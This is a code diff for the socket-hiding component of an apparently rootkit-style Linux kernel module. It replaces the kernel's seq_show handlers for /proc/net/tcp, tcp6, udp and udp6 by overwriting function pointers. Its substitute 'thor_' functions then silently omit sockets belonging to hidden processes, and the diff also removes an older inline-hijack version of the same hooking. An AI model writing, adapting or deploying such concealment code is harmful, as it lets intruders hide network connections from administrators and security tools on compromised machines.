@@ -1,5 +1,3 @@
-#include "logging.h"
-#include "pidhider.h"
 #include "sockethider.h"
 
 #include <linux/fdtable.h>
@@ -11,19 +9,23 @@
 #include <net/tcp.h>
 #include <net/udp.h>
 
-#include "helper.h"
-#include "hijack.h"
 #include "logging.h"
+#include "pidhider.h"
 
-/* original functions which we need to hijack */
-static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
-static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
-static int (*udp4_seq_show)(struct seq_file *seq, void *v);
-static int (*udp6_seq_show)(struct seq_file *seq, void *v);
+/* simplify function pointer */
+typedef int (*seq_show_fun)(struct seq_file*, void*);
+
+/* original functions */
+static seq_show_fun orig_tcp4_seq_show;
+static seq_show_fun orig_tcp6_seq_show;
+static seq_show_fun orig_udp4_seq_show;
+static seq_show_fun orig_udp6_seq_show;
 
 /* function prototypes */
-static void *get_tcp_seq_show(const char *path);
-static void *get_udp_seq_show(const char *path);
+static seq_show_fun replace_tcp_seq_show(seq_show_fun new_seq_show,
+        const char *path);
+static seq_show_fun replace_udp_seq_show(seq_show_fun new_seq_show,
+        const char *path);
 static int thor_tcp4_seq_show(struct seq_file *seq, void *v);
 static int thor_tcp6_seq_show(struct seq_file *seq, void *v);
 static int thor_udp4_seq_show(struct seq_file *seq, void *v);
@@ -32,171 +34,135 @@ static bool is_socket_process_hidden(struct sock *sp);
 
 int sockethider_init(void)
 {
-    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
-    if (tcp4_seq_show == NULL)
+    LOG_INFO("replacing socket seq show functions");
+
+    orig_tcp4_seq_show = replace_tcp_seq_show(thor_tcp4_seq_show, "/proc/net/tcp");
+    orig_tcp6_seq_show = replace_tcp_seq_show(thor_tcp6_seq_show, "/proc/net/tcp6");
+    orig_udp4_seq_show = replace_udp_seq_show(thor_udp4_seq_show, "/proc/net/udp");
+    orig_udp6_seq_show = replace_udp_seq_show(thor_udp6_seq_show, "/proc/net/udp6");
+
+    if (orig_tcp4_seq_show == NULL) {
+        LOG_ERROR("could not sucessfully replace tcp4 seq show functions");
         return -1;
+    }
 
-    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
-    if (tcp6_seq_show == NULL)
+    if (orig_tcp6_seq_show == NULL) {
+        LOG_ERROR("could not sucessfully replace tcp6 seq show functions");
         return -1;
+    }
 
-    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
-    if (udp4_seq_show == NULL)
+    if (orig_udp4_seq_show == NULL) {
+        LOG_ERROR("could not sucessfully replace udp4 seq show functions");
         return -1;
+    }
 
-    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
-    if (udp6_seq_show == NULL)
+    if (orig_udp6_seq_show == NULL) {
+        LOG_ERROR("could not sucessfully replace udp6 seq show functions");
         return -1;
-
-    LOG_INFO("hijacking socket seq show functions");
-
-    hijack(tcp4_seq_show, thor_tcp4_seq_show);
-    hijack(tcp6_seq_show, thor_tcp6_seq_show);
-    hijack(udp4_seq_show, thor_udp4_seq_show);
-    hijack(udp6_seq_show, thor_udp6_seq_show);
+    }
 
     return 0;
 }
 
 void sockethider_cleanup(void)
 {
-    LOG_INFO("unhijacking socket seq show functions");
+    LOG_INFO("replacing socket seq show functions with original ones");
 
-    if (tcp4_seq_show != NULL)
-        unhijack(tcp4_seq_show);
-
-    if (tcp6_seq_show != NULL)
-        unhijack(tcp6_seq_show);
-
-    if (udp4_seq_show != NULL)
-        unhijack(udp4_seq_show);
-
-    if (udp6_seq_show != NULL)
-        unhijack(udp6_seq_show);
+    replace_tcp_seq_show(orig_tcp4_seq_show, "/proc/net/tcp");
+    replace_tcp_seq_show(orig_tcp6_seq_show, "/proc/net/tcp6");
+    replace_udp_seq_show(orig_udp4_seq_show, "/proc/net/udp");
+    replace_udp_seq_show(orig_udp6_seq_show, "/proc/net/udp6");
 }
 
-/* function to get a pointer to the tcp{4,6}_seq_show function */
-static void *get_tcp_seq_show(const char *path)
+/* replace tcp seq show function, returns old one */
+static seq_show_fun replace_tcp_seq_show(seq_show_fun new_seq_show,
+        const char *path)
 {
-    void *ret;
-    struct file *filep;
+    void *old_seq_show;
+    struct file *filp;
     struct tcp_seq_afinfo *afinfo;
 
-    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
+    if ((filp = filp_open(path, O_RDONLY, 0)) == NULL)
         return NULL;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-    afinfo = PDE(filep->f_dentry->d_inode)->data;
+    afinfo = PDE(filp->f_dentry->d_inode)->data;
 #else
-    afinfo = PDE_DATA(filep->f_dentry->d_inode);
+    afinfo = PDE_DATA(filp->f_dentry->d_inode);
 #endif
-    ret = afinfo->seq_ops.show;
 
-    filp_close(filep, 0);
+    old_seq_show = afinfo->seq_ops.show;
+    afinfo->seq_ops.show = new_seq_show;
 
-    return ret;
+    filp_close(filp, 0);
+
+    return old_seq_show;
+
 }
 
-/* function to get a pointer to the udp{4,6}_seq_show function */
-static void *get_udp_seq_show(const char *path)
+/* replace udp seq show function, returns old one */
+static seq_show_fun replace_udp_seq_show(seq_show_fun new_seq_show,
+        const char *path)
 {
-    void *ret;
-    struct file *filep;
+    void *old_seq_show;
+    struct file *filp;
     struct udp_seq_afinfo *afinfo;
 
-    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
+    if ((filp = filp_open(path, O_RDONLY, 0)) == NULL)
         return NULL;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-    afinfo = PDE(filep->f_dentry->d_inode)->data;
+    afinfo = PDE(filp->f_dentry->d_inode)->data;
 #else
-    afinfo = PDE_DATA(filep->f_dentry->d_inode);
+    afinfo = PDE_DATA(filp->f_dentry->d_inode);
 #endif
-    ret = afinfo->seq_ops.show;
 
-    filp_close(filep, 0);
+    old_seq_show = afinfo->seq_ops.show;
+    afinfo->seq_ops.show = new_seq_show;
 
-    return ret;
+    filp_close(filp, 0);
+
+    return old_seq_show;
 }
 
 static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
 {
-    int ret;
-
     /* hide port */
     if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
         return 0;
 
-    /*
-     * TODO: this leaves the tcp4_seq_show function unhijacked for a few
-     * cycles, ideally we would execute the content of tcp4_seq_show_firstinstr
-     * and jump to the second instruction of the original tcp4_seq_show
-     */
-    unhijack(tcp4_seq_show);
-    ret = tcp4_seq_show(seq, v);
-    hijack(tcp4_seq_show, thor_tcp4_seq_show);
-
-    return ret;
+    /* call original */
+    return orig_tcp4_seq_show(seq, v);
 }
 
 static int thor_tcp6_seq_show(struct seq_file *seq, void *v)
 {
-    int ret;
-
     /* hide port */
     if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
         return 0;
 
-    /*
-     * TODO: this leaves the tcp6_seq_show function unhijacked for a few
-     * cycles, ideally we would execute the content of tcp6_seq_show_firstinstr
-     * and jump to the second instruction of the original tcp6_seq_show
-     */
-    unhijack(tcp6_seq_show);
-    ret = tcp6_seq_show(seq, v);
-    hijack(tcp6_seq_show, thor_tcp6_seq_show);
-
-    return ret;
+    /* call original */
+    return orig_tcp6_seq_show(seq, v);
 }
 
 static int thor_udp4_seq_show(struct seq_file *seq, void *v)
 {
-    int ret;
-
     /* hide port */
     if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
         return 0;
 
-    /*
-     * TODO: this leaves the udp4_seq_show function unhijacked for a few
-     * cycles, ideally we would execute the content of udp4_seq_show_firstinstr
-     * and jump to the second instruction of the original udp4_seq_show
-     */
-    unhijack(udp4_seq_show);
-    ret = udp4_seq_show(seq, v);
-    hijack(udp4_seq_show, thor_udp4_seq_show);
-
-    return ret;
+    /* call original */
+    return orig_udp4_seq_show(seq, v);
 }
 
 static int thor_udp6_seq_show(struct seq_file *seq, void *v)
 {
-    int ret;
-
     /* hide port */
     if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
         return 0;
 
-    /*
-     * TODO: this leaves the udp6_seq_show function unhijacked for a few
-     * cycles, ideally we would execute the content of udp6_seq_show_firstinstr
-     * and jump to the second instruction of the original udp6_seq_show
-     */
-    unhijack(udp6_seq_show);
-    ret = udp6_seq_show(seq, v);
-    hijack(udp6_seq_show, thor_udp6_seq_show);
-
-    return ret;
+    /* call original */
+    return orig_udp6_seq_show(seq, v);
 }
 
 /* true if socket is owned by a hidden process */
